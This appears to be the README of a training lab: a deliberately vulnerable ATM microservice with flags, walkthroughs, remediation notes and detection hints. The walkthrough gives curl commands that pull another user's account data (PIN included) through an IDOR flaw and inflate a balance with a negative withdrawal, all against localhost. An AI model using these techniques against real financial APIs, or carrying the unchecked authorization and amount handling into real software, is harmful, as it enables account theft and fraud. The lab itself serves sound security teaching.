# 🏧 ATM Microservice Cyber Range Lab

[![Difficulty: Level 1-3](https://img.shields.io/badge/Difficulty-Level%201--3-orange.svg)](#vulnerabilities--mission-objectives)
[![Port: 8080](https://img.shields.io/badge/Port-8080-blue.svg)](#deployment)

A lightweight microservice simulating an ATM transaction processing web application and API. Designed to train cybersecurity learners on API vulnerability assessment, Broken Object Level Authorization (BOLA / IDOR), Business Logic flaws in transaction processing, and security remediation.

---

## 📋 Table of Contents
1. [Architecture](#architecture)
2. [Deployment](#deployment)
3. [Mission Objectives & Flags](#mission-objectives--flags)
4. [Vulnerability Walkthrough (Offensive Guide)](#vulnerability-walkthrough-offensive-guide)
5. [Secure Mode & Remediation (Defensive Guide)](#secure-mode--remediation-defensive-guide)
6. [Observability & Detection Hints](#observability--detection-hints)

---

## 📐 Architecture

```text
                        Attacker / Client
                               │
                      HTTP / REST (Port 8080)
                               │
                               ▼
                    ┌─────────────────────┐
                    │  ATM Microservice   │
                    │   (FastAPI/Python)  │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │  SQLite Database    │
                    │      (atm.db)       │
                    └─────────────────────┘
```

---

## 🚀 Deployment

### Option A: Launching Vulnerable Mode (Offensive Practice)
```bash
cd labs/atm
docker compose up -d --build
```
Access the application UI at `http://localhost:8080`.

### Option B: Launching Secure Mode (Remediation & Defense)
```bash
cd labs/atm
docker compose -f docker-compose.secure.yml up -d --build
```

---

## 🎯 Mission Objectives & Flags

| Objective | Target | Vulnerability Class | Flag / Reward |
| :--- | :--- | :--- | :--- |
| **Mission 1** | Access Account `ACC-9000` balance & details | IDOR / BOLA (API) | `FLAG{ATM_IDOR_BOLA_AUTHORIZATION_BYPASS_2026}` |
| **Mission 2** | Inflate balance without depositing funds | Business Logic Flaw | Infinite Balance Exploitation |
| **Mission 3** | Access Admin Audit API | Broken Authentication | Master System Reserve Metrics |

---

## 🔍 Vulnerability Walkthrough (Offensive Guide)

### 🔴 Vulnerability 1: Insecure Direct Object Reference / BOLA (`/api/v1/accounts/{account_number}`)
- **Location**: `GET /api/v1/accounts/ACC-9000`
- **Description**: The API endpoint returns full account details (including PIN codes and CTF flags) for any given account number without validating whether the requesting session owns the target account.
- **Exploitation Command**:
  ```bash
  curl -s http://localhost:8080/api/v1/accounts/ACC-9000
  ```
- **Output**:
  ```json
  {
    "id": 4,
    "account_number": "ACC-9000",
    "card_number": "4000999999999000",
    "pin": "0000",
    "holder_name": "System Admin",
    "balance": 999999.99,
    "account_type": "Master",
    "is_admin": 1,
    "flag": "FLAG{ATM_IDOR_BOLA_AUTHORIZATION_BYPASS_2026}"
  }
  ```

### 🔴 Vulnerability 2: Business Logic Flaw in Transactions (`/transaction` & `/transfer`)
- **Location**: `POST /transaction` and `POST /transfer`
- **Description**: The withdrawal and transfer logic does not validate if `amount` is positive. Submitting a negative withdrawal amount (`amount = -500`) results in `balance = balance - (-500)` -> `balance = balance + 500`.
- **Exploitation Command**:
  ```bash
  curl -X POST http://localhost:8080/transaction \
       -b "session_account=ACC-1001" \
       -d "account_number=ACC-1001&action=WITHDRAW&amount=-5000"
  ```

---

## 🟢 Secure Mode & Remediation (Defensive Guide)

In **Secure Mode** (`SECURE_MODE=true`):
1. **BOLA Fix**: The application checks `get_current_user_from_session(request)` and asserts that `user['account_number'] == account_number` before returning record details. Sensitive fields (`pin`, `flag`) are sanitized from responses.
2. **Business Logic Fix**: Strict validation enforces `amount > 0` on all transactions and transfers, preventing arithmetic inflation attacks.
3. **Admin Auth Fix**: Admin endpoints enforce role-based access control (`is_admin == 1`).

---

## 📊 Observability & Detection Hints

The microservice outputs structured JSON logs to stdout:

```json
{"time": "2026-09-11 12:00:00,000", "level": "WARNING", "message": "UNAUTHORIZED TRANSACTION ATTEMPT: ACC-1001 tried to transact on ACC-9000"}
```

### Writing a Detection Rule (Wazuh / Suricata / Zabbix):
- **Log Pattern**: Search for HTTP requests to `/api/v1/accounts/` where cookie `session_account` differs from the requested path parameter.
- **Metric Anomaly**: Alert if transaction amount is negative (`amount < 0`).
